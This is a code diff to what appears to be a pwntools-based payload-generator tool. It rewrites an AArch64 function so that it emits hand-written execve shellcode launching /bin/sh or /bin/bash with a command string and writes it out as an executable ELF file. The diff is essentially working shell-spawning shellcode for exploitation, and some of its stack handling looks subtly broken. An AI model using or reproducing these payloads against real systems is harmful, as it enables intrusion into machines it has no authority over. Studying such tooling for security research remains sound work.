@@ -696,16 +696,116 @@ def aarch64_cmd_file(cmd, cmd_whole_path, envp,filename):
 	context.endian = 'little'
 	context.bits = '64'
 	log.success("CMD: "+cmd)
+
+	shellcode = '''
+	.section .data
+	.data
+	cmd: .ascii "%s\\x00"
+	.section .shellcode,"awx"
+	.global _start
+	.global __start
+	.p2align 2
+	_start:
+	__start:
+	'''%(cmd)
+
 	if cmd_whole_path == "/bin/sh" or cmd_whole_path == "sh":
-		cmd_whole_path = "/bin/sh"
-		cmd_basic = ['sh','-c']
-		cmd_basic.append(cmd)
-		cmd = my_package.remove_null(cmd_basic)
+		
+		shellcode += '''
+	mov  x14, #25135
+	movk x14, #28265, lsl #16
+	movk x14, #29487, lsl #0x20
+	movk x14, #104, lsl #0x30
+	str x14, [sp, #-16]!
+	mov  x0, sp
+	/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
+	/* push b'/bin/sh\x00-i\x00' */
+	/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
+	mov  x14, #25135
+	movk x14, #28265, lsl #16
+	movk x14, #29487, lsl #0x20
+	movk x14, #104, lsl #0x30
+	mov  x15, #25389
+	stp x14, x15, [sp, #-16]!
+
+	/* push null terminator */
+	mov  x14, xzr
+	str x14, [sp, #-8]!
+
+	/* push pointers onto the stack */
+	mov  x14, #16
+	add x14, sp, x14
+	sub sp, sp, 8
+
+	str x14, [sp, #-8]! /* b'/bin/sh\x00' */
+	mov  x14, #24
+	add x14, sp, x14
+	sub sp, sp, 8
+	str x14, [sp, #0]! /* b'-i\x00' */
+
+	mov x1, sp
+
+
+	ldr x15, =cmd
+
+	str x15, [sp, #16]
+
+	/* set x1 to the current top of the stack */
+	mov  x2, xzr
+	/* call execve() */
+	mov  x8, #0xdd
+	svc 0
+		'''
+
 	elif cmd_whole_path == "/bin/bash" or cmd_whole_path == "bash":
-		cmd_whole_path = "/bin/bash"
-		cmd_basic = ['/bin/bash','-c']
-		cmd_basic.append(cmd)
-		cmd = my_package.remove_null(cmd_basic)
+		shellcode += '''
+	mov  x14, #25135
+	movk x14, #28265, lsl #16
+	movk x14, #25135, lsl #0x20
+	movk x14, #29537, lsl #0x30
+	mov  x15, #104
+	stp x14, x15, [sp, #-16]!
+	mov  x0, sp
+	/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
+	/* push b'/bin/bash\x00-i\x00' */
+	/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
+	mov  x14, #25135
+	movk x14, #28265, lsl #16
+	movk x14, #25135, lsl #0x20
+	movk x14, #29537, lsl #0x30
+	/* Set x15 = 1764556904 = 0x692d0068 */
+	mov  x15, #104
+	movk x15, #25389, lsl #16
+	stp x14, x15, [sp, #-16]!
+
+	/* push null terminator */
+	mov  x14, xzr
+	str x14, [sp, #-8]!
+
+	/* push pointers onto the stack */
+	mov  x14, #18
+	add x14, sp, x14
+	sub sp, sp ,8
+	str x14, [sp, #-8]!
+	mov  x14, #24
+	add x14, sp, x14
+	sub sp, sp, 8
+	stp x5, x14 , [sp, #-8]!
+
+	add x1, sp, 8
+
+	sub sp, sp, 8
+
+	ldr x15, =cmd
+
+	str x15, [sp, #32]
+
+	/* set x1 to the current top of the stack */
+	mov  x2, xzr
+	/* call execve() */
+	mov  x8, #0xdd
+	svc 0
+	'''
 	else:
 		#cmd = remove_null(handle_quotation_mark(cmd))
 		cmd = my_package.remove_null(my_package.spaceReplace(cmd))
@@ -713,30 +813,23 @@ def aarch64_cmd_file(cmd, cmd_whole_path, envp,filename):
 		envp = 0
 	else:
 		envp = my_package.get_envir_args(envp)
-	shellcode = shellcraft.execve(cmd_whole_path, cmd, envp)
-	shellcode = asm(shellcode)
-	ELF_data=make_elf(shellcode)
-	if filename==None:
+	#shellcode = shellcraft.execve(cmd_whole_path, cmd, envp)
+	#shellcode = asm(shellcode)
+	#ELF_data=make_elf(shellcode)
+	if(filename == None ):
 		log.info("waiting 3s")
 		sleep(1)
 		filename=context.arch + "-cmd-" + my_package.random_string_generator(4,chars)
-		f=open(filename,"wb")
-		f.write(ELF_data)
-		f.close()
-		os.chmod(filename, 0o755)
+		my_package.my_make_elf(shellcode, filename)
 		log.success("{} is ok in current path ./".format(filename))
 		context.arch='i386'
 		context.bits="32"
 		context.endian="little"
-		return 
 	else:
 		if(os.path.exists(filename) != True):
 			log.info("waiting 3s")
 			sleep(1)
-			f=open(filename,"wb")
-			f.write(ELF_data)
-			f.close()
-			os.chmod(filename, 0o755)
+			my_package.my_make_elf(shellcode, filename)
 			log.success("{} generated successfully".format(filename))
 			context.arch='i386'
 			context.bits="32"
@@ -748,18 +841,14 @@ def aarch64_cmd_file(cmd, cmd_whole_path, envp,filename):
 			if choise == "y\n" or choise == "\n":
 				log.info("waiting 3s")
 				sleep(1)
-				f=open(filename,"wb")
-				f.write(ELF_data)
-				f.close()
-				os.chmod(filename, 0o755)
+				my_package.my_make_elf(shellcode, filename)
 				log.success("{} generated successfully".format(filename))
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 				return 
 			else:
-				return 
-
+				return
 
 
 def x86_cmd_file(cmd, cmd_whole_path, envp,filename):
